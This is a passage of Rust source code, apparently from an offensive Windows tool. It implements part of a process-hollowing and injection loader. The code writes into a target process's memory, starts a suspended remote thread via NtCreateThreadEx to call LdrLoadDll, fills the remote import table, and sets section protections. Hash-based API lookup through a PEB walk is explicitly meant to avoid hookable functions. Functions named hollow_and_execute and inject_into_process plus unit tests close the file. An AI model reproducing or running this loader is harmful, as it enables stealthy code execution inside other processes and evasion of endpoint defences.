        if desc_off + 20 > payload.len() {
            break;
        }
        let orig_first_thunk_rva =
            u32::from_le_bytes(payload[desc_off..desc_off + 4].try_into().unwrap()) as usize;
        let name_rva =
            u32::from_le_bytes(payload[desc_off + 12..desc_off + 16].try_into().unwrap()) as usize;
        let first_thunk_rva =
            u32::from_le_bytes(payload[desc_off + 16..desc_off + 20].try_into().unwrap()) as usize;
        if name_rva == 0 {
            break;
        }

        // Convert all three RVAs to file offsets.
        let name_off = rva_to_file_offset(name_rva, nt);
        let first_thunk_off = rva_to_file_offset(first_thunk_rva, nt);
        let thunk_rva_off = if orig_first_thunk_rva != 0 {
            rva_to_file_offset(orig_first_thunk_rva, nt)
        } else {
            first_thunk_off
        };

        if name_off >= payload.len() {
            desc_off += 20;
            continue;
        }

        let dll_name_bytes = &payload[name_off..];
        let null_pos = dll_name_bytes
            .iter()
            .position(|&b| b == 0)
            .unwrap_or(dll_name_bytes.len());
        let dll_name_str = match std::str::from_utf8(&dll_name_bytes[..null_pos]) {
            Ok(s) => s,
            Err(_) => {
                desc_off += 20;
                continue;
            }
        };
        let dll_name_lower = format!("{}\0", dll_name_str.to_ascii_lowercase());

        // Find/load the DLL in our process
        let hash = pe_resolve::hash_str(dll_name_lower.as_bytes());
        let local_existing = pe_resolve::get_module_handle_by_hash(hash);
        let dll_base = if let Some(b) = local_existing {
            b
        } else {
            // DLL was not already in our address space.  Load it into the
            // *target* process first so that:
            //   L-02: DLL_PROCESS_ATTACH fires in the target
            //   L-01: session-wide ASLR ensures both processes map the DLL at
            //         the same preferred base, so addresses we resolve locally
            //         remain valid remotely.
            if let (Some(nt_create_addr), Some(ldr_addr)) = (ntcreate_opt, ldr_load_dll_addr) {
                let wide_name: Vec<u16> = dll_name_str
                    .encode_utf16()
                    .chain(std::iter::once(0))
                    .collect();
                let wide_bytes = wide_name.len() * 2;
                let us_offset = wide_bytes;
                let base_addr_offset = us_offset
                    + std::mem::size_of::<winapi::shared::ntdef::UNICODE_STRING>();
                let total_remote = base_addr_offset + std::mem::size_of::<usize>();

                let remote_block = VirtualAllocEx(
                    hprocess,
                    std::ptr::null_mut(),
                    total_remote,
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_READWRITE,
                );
                if !remote_block.is_null() {
                    let mut wr = 0usize;
                    if WriteProcessMemory(
                        hprocess,
                        remote_block,
                        wide_name.as_ptr() as _,
                        wide_bytes,
                        &mut wr,
                    ) != 0
                    {
                        let remote_us_ptr =
                            (remote_block as usize + us_offset) as *mut c_void;
                        let remote_base_out =
                            (remote_block as usize + base_addr_offset) as *mut c_void;
                        let remote_str_va = remote_block as usize;

                        let mut remote_us = winapi::shared::ntdef::UNICODE_STRING {
                            Length: (wide_bytes.saturating_sub(2)) as u16,
                            MaximumLength: wide_bytes as u16,
                            Buffer: remote_str_va as *mut u16,
                        };

                        if WriteProcessMemory(
                            hprocess,
                            remote_us_ptr,
                            &mut remote_us as *mut _ as *const c_void,
                            std::mem::size_of::<winapi::shared::ntdef::UNICODE_STRING>(),
                            &mut wr,
                        ) != 0
                        {
                            let zero_base: usize = 0;
                            if WriteProcessMemory(
                                hprocess,
                                remote_base_out,
                                &zero_base as *const _ as *const c_void,
                                std::mem::size_of::<usize>(),
                                &mut wr,
                            ) != 0
                            {
                                let nt_create_thread: NtCreateThreadExFn =
                                    std::mem::transmute(nt_create_addr);
                                let mut h_thread: *mut c_void = std::ptr::null_mut();
                                let status = nt_create_thread(
                                    &mut h_thread,
                                    0x1FFFFF,
                                    std::ptr::null_mut(),
                                    hprocess,
                                    ldr_addr as *mut c_void,
                                    remote_us_ptr,
                                    0x1, // create suspended so we can set up args
                                    0,
                                    0,
                                    0,
                                    std::ptr::null_mut(),
                                );
                                if status >= 0 && !h_thread.is_null() {
                                    #[cfg(target_arch = "x86_64")]
                                    {
                                        let mut ctx: CONTEXT = std::mem::zeroed();
                                        ctx.ContextFlags = CONTEXT_FULL;
                                        if GetThreadContext(h_thread, &mut ctx) == 0 {
                                            tracing::warn!(
                                                "fix_iat_remote: GetThreadContext before LdrLoadDll failed ({})",
                                                winapi::um::errhandlingapi::GetLastError()
                                            );
                                        } else {
                                            // LdrLoadDll(Path, Flags, ModuleFileName, ModuleHandle)
                                            ctx.Rcx = 0;
                                            ctx.Rdx = 0;
                                            ctx.R8 = remote_us_ptr as u64;
                                            ctx.R9 = remote_base_out as u64;
                                            if SetThreadContext(h_thread, &ctx) == 0 {
                                                tracing::warn!(
                                                    "fix_iat_remote: SetThreadContext for LdrLoadDll failed ({})",
                                                    winapi::um::errhandlingapi::GetLastError()
                                                );
                                            }
                                        }
                                    }

                                    #[cfg(not(target_arch = "x86_64"))]
                                    {
                                        tracing::warn!(
                                            "fix_iat_remote: remote LdrLoadDll argument setup only implemented on x86_64"
                                        );
                                    }

                                    ResumeThread(h_thread);
                                    WaitForSingleObject(h_thread, INFINITE);

                                    let mut loaded_remote_base: usize = 0;
                                    let mut rd = 0usize;
                                    if ReadProcessMemory(
                                        hprocess,
                                        remote_base_out,
                                        &mut loaded_remote_base as *mut _ as *mut c_void,
                                        std::mem::size_of::<usize>(),
                                        &mut rd,
                                    ) == 0
                                        || rd != std::mem::size_of::<usize>()
                                    {
                                        tracing::warn!(
                                            "fix_iat_remote: could not read remote LdrLoadDll base output for {}",
                                            dll_name_str
                                        );
                                    } else if loaded_remote_base == 0 {
                                        tracing::warn!(
                                            "fix_iat_remote: remote LdrLoadDll did not report a loaded base for {}",
                                            dll_name_str
                                        );
                                    }

                                    pe_resolve::close_handle(h_thread as *mut core::ffi::c_void);
                                } else {
                                    tracing::warn!(
                                        "fix_iat_remote: NtCreateThreadEx for remote LdrLoadDll failed: {:x}",
                                        status
                                    );
                                }
                            }
                        }
                    }
                    winapi::um::memoryapi::VirtualFreeEx(hprocess, remote_block, 0, MEM_RELEASE);
                }
            } else {
                tracing::warn!(
                    "fix_iat_remote: NtCreateThreadEx or LdrLoadDll unavailable; skipping remote DLL load for {}",
                    dll_name_str
                );
            }
            // Now load locally — use LdrLoadDll resolved via PEB walk (M-26)
            // instead of the hookable LoadLibraryA IAT entry.
            let hmod = ldr_load_local(dll_name_str);
            hmod
        };

        if dll_base == 0 {
            tracing::warn!("fix_iat_remote: could not find/load {}", dll_name_str);
            desc_off += 20;
            continue;
        }

        let mut thunk_off = thunk_rva_off; // file offset into INT (import name table)
        // Track the IAT position as an RVA, not a file offset.  The remote process
        // maps PE sections at their virtual addresses (RVAs relative to image base),
        // so writes to the remote IAT must target `remote_base + IAT_RVA`, NOT
        // `remote_base + file_offset`.  The two values differ whenever the .idata
        // section has `PointerToRawData != VirtualAddress` (the common case for any
        // PE with a non-trivial section layout).
        let mut iat_rva = first_thunk_rva; // RVA for remote IAT write targets
        loop {
            if thunk_off + 8 > payload.len() {
                break;
            }
            let thunk_val =
                u64::from_le_bytes(payload[thunk_off..thunk_off + 8].try_into().unwrap());
            if thunk_val == 0 {
                break;
            }

            let func_addr: usize = if thunk_val & (1u64 << 63) != 0 {
                // Ordinal import: M-26 — resolve via clean export-table walk.
                let ord = (thunk_val & 0xFFFF) as u32;
                let ep = local_get_export_addr_by_ordinal(dll_base, ord);
                if ep.is_null() {
                    tracing::warn!(
                        "fix_iat_remote: ordinal {} in {} unresolved (refusing GetProcAddress fallback)",
                        ord, dll_name_str
                    );
                    0
                } else {
                    ep as usize
                }
            } else {
                // Named import: thunk_val is an RVA to IMAGE_IMPORT_BY_NAME
                let ibn_rva = (thunk_val & 0x7FFF_FFFF) as usize;
                let ibn_off = rva_to_file_offset(ibn_rva, nt);
                if ibn_off + 2 >= payload.len() {
                    thunk_off += 8;
                    iat_rva += 8;
                    continue;
                }
                let name_start = ibn_off + 2; // skip 2-byte Hint
                let name_bytes = &payload[name_start..];
                let nlen = name_bytes
                    .iter()
                    .position(|&b| b == 0)
                    .unwrap_or(name_bytes.len());
                let mut name_null = name_bytes[..nlen].to_vec();
                name_null.push(0);
                let hash = pe_resolve::hash_str(&name_null);
                match pe_resolve::get_proc_address_by_hash(dll_base, hash) {
                    Some(addr) => addr,
                    None => {
                        tracing::warn!(
                            "fix_iat_remote: {}!{} unresolved via PEB walk, leaving IAT slot empty (M-26)",
                            dll_name_str,
                            String::from_utf8_lossy(
                                &name_null[..name_null.len().saturating_sub(1)]
                            )
                        );
                        0
                    }
                }
            };

            if func_addr != 0 {
                // Write the resolved address into the remote IAT entry.  Use the
                // RVA (not the file offset) to compute the remote target address.
                let iat_remote = (remote_base + iat_rva) as *mut c_void;
                WriteProcessMemory(
                    hprocess,
                    iat_remote,
                    &func_addr as *const _ as _,
                    8,
                    written,
                );
            }
            thunk_off += 8;
            iat_rva += 8;
        }
        desc_off += 20;
    }
    Ok(())
}

/// Apply per-section memory protections after the payload has been written (2.4).
/// Sections with the execute flag get PAGE_EXECUTE_READ; writable-only get
/// PAGE_READWRITE; everything else gets PAGE_READONLY.
#[cfg(windows)]
unsafe fn apply_section_protections(
    hprocess: *mut c_void,
    remote_base: usize,
    nt: *const winapi::um::winnt::IMAGE_NT_HEADERS64,
) {
    use winapi::um::memoryapi::VirtualProtectEx;
    use winapi::um::winnt::{PAGE_EXECUTE_READ, PAGE_READONLY, PAGE_READWRITE};

    const SCN_EXEC: u32 = 0x2000_0000;
    const SCN_WRITE: u32 = 0x8000_0000;

    let num_sections = (*nt).FileHeader.NumberOfSections as usize;
    let first_section = (nt as usize + std::mem::size_of::<winapi::um::winnt::IMAGE_NT_HEADERS64>())
        as *const winapi::um::winnt::IMAGE_SECTION_HEADER;
    for i in 0..num_sections {
        let sec = &*first_section.add(i);
        let chars = sec.Characteristics;
        let protect = match (chars & SCN_EXEC != 0, chars & SCN_WRITE != 0) {
            (true, true) => PAGE_EXECUTE_READ, // downgrade W+X: no legitimate code section needs RWX
            (true, false) => PAGE_EXECUTE_READ,
            (false, true) => PAGE_READWRITE,
            (false, false) => PAGE_READONLY,
        };
        let virt_size = (*sec.Misc.VirtualSize() as usize).max(sec.SizeOfRawData as usize);
        if virt_size == 0 {
            continue;
        }
        let addr = (remote_base + sec.VirtualAddress as usize) as *mut c_void;
        let mut old = 0u32;
        VirtualProtectEx(hprocess, addr, virt_size, protect, &mut old);
    }
}

#[cfg(not(windows))]
pub fn hollow_and_execute(_payload: &[u8]) -> Result<()> {
    Err(anyhow!("hollow_and_execute is only available on Windows"))
}

#[cfg(not(windows))]
pub fn inject_into_process(_pid: u32, _payload: &[u8]) -> Result<()> {
    Err(anyhow!("inject_into_process is only available on Windows"))
}

// ──────────────────────────────────────────────────────────────────────────────
// Unit tests
// ──────────────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::{rva_to_file_offset_sections, SectionDesc};

    /// Build a synthetic section table where raw offsets and virtual addresses
    /// deliberately differ so a naive RVA-as-file-offset would be wrong.
    ///
    /// Layout:
    ///  .text  VA=0x1000  VS=0x200  raw=0x400   (raw ≠ VA)
    ///  .data  VA=0x2000  VS=0x100  raw=0x600   (raw ≠ VA)
    ///  .idata VA=0x3000  VS=0x080  raw=0x700   (IAT section)
    fn synthetic_sections() -> Vec<SectionDesc> {
        vec![
            SectionDesc { virtual_address: 0x1000, virtual_size: 0x200, raw_offset: 0x400 },
            SectionDesc { virtual_address: 0x2000, virtual_size: 0x100, raw_offset: 0x600 },
            SectionDesc { virtual_address: 0x3000, virtual_size: 0x080, raw_offset: 0x700 },
        ]
    }

    #[test]
    fn rva_in_text_section_maps_to_correct_raw_offset() {
        let secs = synthetic_sections();
        // RVA 0x1050 is 0x50 bytes into .text (VA=0x1000, raw=0x400).
        // Expected file offset: 0x400 + 0x50 = 0x450.
        assert_eq!(rva_to_file_offset_sections(0x1050, &secs), 0x450);
    }

    #[test]
    fn rva_in_idata_section_maps_to_iat_raw_offset() {
        let secs = synthetic_sections();
        // RVA 0x3010 is 0x10 bytes into .idata (VA=0x3000, raw=0x700).
        // Expected: 0x700 + 0x10 = 0x710.
        // A naive RVA-as-file-offset would give 0x3010 — wrong.
        assert_eq!(rva_to_file_offset_sections(0x3010, &secs), 0x710);
    }

    #[test]
    fn rva_in_header_area_falls_back_to_identity() {
        let secs = synthetic_sections();
        // RVA below first section VA is in the PE header; maps 1:1.
        assert_eq!(rva_to_file_offset_sections(0x100, &secs), 0x100);
    }

    #[test]
    fn rva_exactly_at_section_start() {
        let secs = synthetic_sections();
        // RVA 0x2000 is exactly the start of .data (raw=0x600).
        assert_eq!(rva_to_file_offset_sections(0x2000, &secs), 0x600);
    }

    #[test]
    fn rva_one_past_section_end_falls_back() {
        let secs = synthetic_sections();
        // RVA 0x2100 is exactly one byte past .data (VA=0x2000, VS=0x100),
        // so it should fall through to the identity fallback.
        assert_eq!(rva_to_file_offset_sections(0x2100, &secs), 0x2100);
    }

    #[test]
    fn non_windows_hollow_and_execute_returns_error() {
        #[cfg(not(windows))]
        {
            let result = super::hollow_and_execute(&[0x4d, 0x5a]);
            assert!(result.is_err());
            assert!(result.unwrap_err().to_string().contains("Windows"));
        }
    }
}
